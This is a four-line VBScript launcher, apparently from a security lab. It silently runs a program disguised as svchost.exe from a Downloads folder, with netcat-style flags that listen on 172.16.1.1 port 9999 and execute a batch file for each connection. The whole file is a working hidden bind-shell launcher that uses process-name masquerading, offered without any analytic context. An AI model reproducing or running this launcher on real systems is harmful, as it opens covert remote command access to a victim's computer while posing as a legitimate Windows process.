Dim WShell 
Set WShell = CreateObject("WScript.Shell") 
WShell.Run "c:\users\securityNik\Downloads\svchost.exe --nodns --verbose --keep-open --listen 172.16.1.1 9999 --exec c:\users\securityNik\Downloads\svchost.exeSUWtHEh.bat",0 
Set WShell = Nothing 
